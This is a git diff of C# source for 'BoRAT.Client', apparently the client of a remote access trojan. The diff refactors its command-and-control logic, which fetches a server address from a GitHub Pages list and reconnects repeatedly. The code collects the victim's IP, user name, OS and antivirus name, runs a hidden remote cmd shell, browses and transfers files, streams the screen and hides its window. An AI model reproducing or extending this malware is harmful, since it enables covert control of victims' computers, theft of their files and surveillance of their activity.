@@ -18,12 +18,12 @@ namespace BoRAT.Client
 {
     public partial class frmMain : Form
     {
-        string _ip = "127.0.0.1", _port = "999", _delay = "5000", _noip = "no";
-        Socket clientSocket = new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
+        private string serverList = "https://borat-admin.github.io/site/serverList.txt";
 
-        int port { get; set; }
-        int delay {get; set; }
-        IPAddress ipAddress { get; set; }
+        private IPAddress _ip;
+        private int _port, _delay;
+
+        Socket clientSocket = new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
 
         //Cmd Shell
         bool isStarted;
@@ -44,41 +44,55 @@ namespace BoRAT.Client
         public frmMain()
         {
             InitializeComponent();
+            GetConnectionIPs();
+        }
 
-            using (WebClient client = new WebClient())
+        private void GetConnectionIPs()
+        {
+            try
             {
-                string s = client.DownloadString("https://borat-admin.github.io/site/serverList.txt");
+                using (WebClient client = new WebClient())
+                {
+                    string s = client.DownloadString(serverList);
 
-                string[] list = s.Split(':');
+                    string[] list = s.Split(':');
 
-                _ip = list[0];
-                _port = list[1];
+                    _ip = IPAddress.Parse(list[0]);
+                    _port = Convert.ToInt32(list[1]);
+                    _delay = Convert.ToInt32(list[2]);
+
+                    Console.WriteLine("\nServer responded!\nIP: " + _ip + "\nPort: " + _port + "\nDelay: " + _delay);
+                }
             }
-
-            port = int.Parse(_port);
-            delay = int.Parse(_delay);
-            ipAddress = IPAddress.Parse(_ip);
-
+            catch (Exception ex)
+            {
+                Console.WriteLine("INTERNAL ERROR:\n" + ex);
+            }
         }
 
         private void FrmMain_Shown(object sender, EventArgs e)
         {
-            Thread coreThread = new Thread(new ThreadStart(startConnection));
+            Thread coreThread = new Thread(new ThreadStart(StartConnection));
             coreThread.Start();
         }
 
-        private void startConnection()
+        private void StartConnection()
         {
             while(true)
             {
                 if (clientSocket.Connected)
-                    receiveInfo();
+                {
+                    Console.WriteLine("Connected to " + _ip + " on port " + _port);
+                    ReceiveInfo();
+                }
                 else
-                    makeConnection();
+                {
+                    MakeConnection();
+                }
             }
         }
 
-        private void receiveInfo()
+        private void ReceiveInfo()
         {
             byte[] buffer = new byte[1024];
             int received = 0;
@@ -91,7 +105,7 @@ namespace BoRAT.Client
             {
                 clientSocket.Close();
                 clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                makeConnection();
+                MakeConnection();
             }
 
             if (received == 0)
@@ -102,65 +116,45 @@ namespace BoRAT.Client
 
             if (isFileUpload)
             {
-                processUploadRequest(data);
-                //processUploadRequest(data);
+                ProcessUploadRequest(data);
             }
 
             if(!isFileUpload)
-                processNormalRequest(data);
+                ProcessNormalRequest(data);
         }
 
-        private void makeConnection()
+        private void MakeConnection()
         {
             while(!clientSocket.Connected)
             {
                 try
                 {
-                    if(_noip.Equals("no"))
-                        clientSocket.Connect(new IPEndPoint(ipAddress, port));
-                    
-                    else if(_noip.Equals("yes"))
-                        clientSocket.Connect(Dns.GetHostAddresses(_ip), port);
+                    clientSocket.Connect(Dns.GetHostAddresses(Convert.ToString(_ip)), _port);
 
-                    Thread.Sleep(delay);
+                    Thread.Sleep(_delay);
                 }
-                catch (SocketException) {
-                    using (WebClient client = new WebClient())
-                    {
-                        
-                        string s = client.DownloadString("https://borat-admin.github.io/site/serverList.txt");
-                        Console.WriteLine(s);
-
-                        string[] list = s.Split(':');
-
-                        _ip = list[0];
-                        _port = list[1];
-
-                        Console.WriteLine(list[0]);
-                        Console.WriteLine(list[1]);
-                    }
-
-                    port = int.Parse(_port);
-                    delay = int.Parse(_delay);
-                    ipAddress = IPAddress.Parse(_ip);
+                catch (SocketException)
+                {
+                    // Run just in case IPs change
+                    GetConnectionIPs();
                 };
             }
         }
 
-        private string getPublicIPAddress()
+        private string GetPublicIPAddress()
         {
             string pubIP = new WebClient().DownloadString("https://api.ipify.org");
             return pubIP;
         }
 
-        private string getUserName()
+        private string GetUserName()
         {
             string machinName = Environment.UserName;
             return machinName;
 
         }
 
-        private string getOsName()
+        private string GetOSName()
         {
             string osName;
             RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
@@ -168,7 +162,7 @@ namespace BoRAT.Client
             return osName;
         }
 
-        private string getAvName()
+        private string GetSecurityName()
         {
             string avName = "";
             try
@@ -199,13 +193,13 @@ namespace BoRAT.Client
             return avName;
         }
 
-        private string getTimeDate()
+        private string GetTimeDate()
         {
             string TimeDate = DateTime.Now.ToString();
             return TimeDate;
         }
 
-        private void processNormalRequest(byte[] data)
+        private void ProcessNormalRequest(byte[] data)
         {
             string cmd = Encoding.Unicode.GetString(data);
             cmd = Decrypt(cmd);
@@ -213,18 +207,18 @@ namespace BoRAT.Client
             {
                 string id = cmd.Split('~')[1];
                 string information, pubIp, userName, osName, avName, timeDate;
-                pubIp = getPublicIPAddress();
-                userName = getUserName();
-                osName = getOsName();
-                avName = getAvName();
-                timeDate = getTimeDate();
+                pubIp = GetPublicIPAddress();
+                userName = GetUserName();
+                osName = GetOSName();
+                avName = GetSecurityName();
+                timeDate = GetTimeDate();
 
                 information = id + "~" + pubIp + "~" + userName +
                                "~" + osName + "~" + avName + "~" +
                                timeDate;
                 string sendInfo = "infoBack|" + information;
 
-                sendCommand(sendInfo);
+                SendCommand(sendInfo);
             }
 
             else if (cmd.Equals("startCmd"))
@@ -247,7 +241,7 @@ namespace BoRAT.Client
                 errorOutput = p.StandardError;
                 writeInput.AutoFlush = true;
 
-                Thread cmdShellThread = new Thread(new ThreadStart(runCmdShellCommands));
+                Thread cmdShellThread = new Thread(new ThreadStart(RunCmdShellCommands));
                 cmdShellThread.Start();
             }
 
@@ -261,7 +255,7 @@ namespace BoRAT.Client
 
                 else
                 {
-                    sendError("cmdFaild\n");
+                    SendError("cmdFaild\n");
                 }
             }
 
@@ -282,16 +276,16 @@ namespace BoRAT.Client
 
                     catch (UnauthorizedAccessException ex)
                     {
-                        sendError("FileManager Error!\n" + ex.Message);
+                        SendError("FileManager Error!\n" + ex.Message);
                     }
 
                     catch (IOException ex)
                     {
-                        sendError("FileManager Error!\n" + ex.Message);
+                        SendError("FileManager Error!\n" + ex.Message);
                     }
                 }
 
-                sendCommand(dataToSend);
+                SendCommand(dataToSend);
             }
 
             else if (cmd.StartsWith("enterPath~"))
@@ -305,11 +299,11 @@ namespace BoRAT.Client
                     checkPath = true;
                 else
                 {
-                    sendError("Directory Not Found\n");
+                    SendError("Directory Not Found\n");
                     return;
                 }
 
-                Thread enterDir = new Thread(() => enterDirectory(path));
+                Thread enterDir = new Thread(() => FM_EnterDirectory(path));
                 enterDir.Start();
 
             }
@@ -320,12 +314,12 @@ namespace BoRAT.Client
 
                 if (path.Length == 3 && path.Contains(":\\"))
                 {
-                    sendCommand("backPath~driveList");
+                    SendCommand("backPath~driveList");
                 }
                 else
                 {
                     path = new DirectoryInfo(path).Parent.FullName;
-                    sendCommand("backPath~" + path);
+                    SendCommand("backPath~" + path);
                 }
 
             }
@@ -339,17 +333,17 @@ namespace BoRAT.Client
                     try
                     {
                         string size = new FileInfo(info).Length.ToString();
-                        sendCommand("fInfo~" + size);
+                        SendCommand("fInfo~" + size);
                     }
                     catch (Exception ex)
                     {
-                        sendError("Access Error!.\n" + ex.Message + "\n");
+                        SendError("Access Error!.\n" + ex.Message + "\n");
                     }
 
                 }
                 else
                 {
-                    sendError("File Not Found\n");
+                    SendError("File Not Found\n");
                 }
             }
 
@@ -358,11 +352,11 @@ namespace BoRAT.Client
                 try
                 {
                     byte[] dataToSend = File.ReadAllBytes(fdl_location);
-                    sendFile(dataToSend);
+                    SendFile(dataToSend);
                 }
                 catch (Exception ex)
                 {
-                    sendError("Access Error!.\n" + ex.Message + "\n");
+                    SendError("Access Error!.\n" + ex.Message + "\n");
                 }
             }
 
@@ -373,19 +367,19 @@ namespace BoRAT.Client
                 {
                     fupSize = int.Parse(cmd.Split('~')[2]);
                     receivedFile = new byte[fupSize];
-                    sendCommand("fupConfirm");
+                    SendCommand("fupConfirm");
                     isFileUpload = true;
                 }
                 else
                 {
-                    sendError("File Already Exists.");
+                    SendError("File Already Exists.");
                 }
             }
 
             else if (cmd.Equals("rdpStart"))
             {
                 isRdpStop = false;
-                Thread rdpThread = new Thread(new ThreadStart(streamScreen));
+                Thread rdpThread = new Thread(new ThreadStart(StreamScreen));
                 rdpThread.Start();
             }
 
@@ -393,7 +387,7 @@ namespace BoRAT.Client
                 isRdpStop = true;
         }
 
-        private void processUploadRequest(byte[] data)
+        private void ProcessUploadRequest(byte[] data)
         {
             Buffer.BlockCopy(data, 0, receivedFile, writeSize, data.Length);
 
@@ -413,14 +407,14 @@ namespace BoRAT.Client
                 }
                 catch(Exception ex)
                 {
-                    sendError("File Upload Error!\n" + ex.Message + "\n");
+                    SendError("File Upload Error!\n" + ex.Message + "\n");
                 }
-                sendCommand("fileReceived");
+                SendCommand("fileReceived");
                 isFileUpload = false;
             }
         }
 
-        private void sendCommand(string data)
+        private void SendCommand(string data)
         {
             try
             {
@@ -431,11 +425,11 @@ namespace BoRAT.Client
             catch(Exception)
             {
                 clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                makeConnection();
+                MakeConnection();
             }
         }
 
-        private void sendFile(byte[] data)
+        private void SendFile(byte[] data)
         {
             try
             {
@@ -444,11 +438,11 @@ namespace BoRAT.Client
             catch(Exception)
             {
                 clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                makeConnection();
+                MakeConnection();
             }
         }
 
-        private void sendImage(byte[] data)
+        private void SendImage(byte[] data)
         {
             try
             {
@@ -462,10 +456,10 @@ namespace BoRAT.Client
             catch (Exception)
             {
                 clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                makeConnection();
+                MakeConnection();
             }
         }
-        private void sendError(string data)
+        private void SendError(string data)
         {
             try
             {
@@ -477,10 +471,10 @@ namespace BoRAT.Client
             catch(Exception)
             {
                 clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                makeConnection();
+                MakeConnection();
             }
         }
-        private void runCmdShellCommands()
+        private void RunCmdShellCommands()
         {
             try
             {
@@ -491,31 +485,25 @@ namespace BoRAT.Client
                 {
                     strData += tmpData + "\r";
                     //send command
-                    sendCommand("cmdout§" + strData);
+                    SendCommand("cmdout§" + strData);
                     strData = "";
                 }
 
                 while ((tmpError = errorOutput.ReadLine()) != null)
                 {
                     strError += tmpError + "\r";
-                    sendCommand("cmdout§" + strError);
+                    SendCommand("cmdout§" + strError);
                     strError = "";
                 }
             }
 
-            catch (OutOfMemoryException ex)
+            catch (Exception ex)
             {
-                sendError("Cmd Error!\n" + ex.Message + "\n");
+                SendError("Cmd Error!\n" + ex.Message + "\n");
             }
-
-            catch (IOException ex)
-            {
-                sendError("Cmd Error!\n" + ex.Message + "\n");
-            }
-
         }
 
-        private void enterDirectory(string path)
+        private void FM_EnterDirectory(string path)
         {
             try
             {
@@ -546,41 +534,41 @@ namespace BoRAT.Client
 
                 string dataToSend = "enterPath~" + dir + file;
 
-                sendCommand(dataToSend);
+                SendCommand(dataToSend);
             }
             catch(ArgumentNullException)
             {
-                sendError("Error in EnterPath\n");
+                SendError("Error in EnterPath\n");
             }
             catch(System.Security.SecurityException)
             {
-                sendError("Security Error in EnterPath\n");
+                SendError("Security Error in EnterPath\n");
             }
             catch(ArgumentException)
             {
-                sendError("Error in EnterPath\n");
+                SendError("Error in EnterPath\n");
             }
             catch(UnauthorizedAccessException)
             {
-                sendError("Unauthorized Error in EnterPath\n");
+                SendError("Unauthorized Error in EnterPath\n");
             }
             catch(PathTooLongException)
             {
-                sendError("Error in EnterPath.\nTry Enter With Cmd Shell\n");
+                SendError("Error in EnterPath.\nTry Enter With Cmd Shell\n");
             }
             catch(NotSupportedException)
             {
-                sendError("Unkown Error in EnterPath\n");
+                SendError("Unkown Error in EnterPath\n");
             }
         }
 
-        private void streamScreen()
+        private void StreamScreen()
         {
             while(!isRdpStop)
             {
                 ImageConverter imgConverter = new ImageConverter();
-                byte[] image = (byte[]) imgConverter.ConvertTo(desktopScreen(),typeof(byte[]));
-                sendImage(image);
+                byte[] image = (byte[]) imgConverter.ConvertTo(DesktopScreen(),typeof(byte[]));
+                SendImage(image);
                 Thread.Sleep(1000);
             }
         }
@@ -590,7 +578,7 @@ namespace BoRAT.Client
             this.Hide();
         }
 
-        private Bitmap desktopScreen()
+        private Bitmap DesktopScreen()
         {
             try
             {
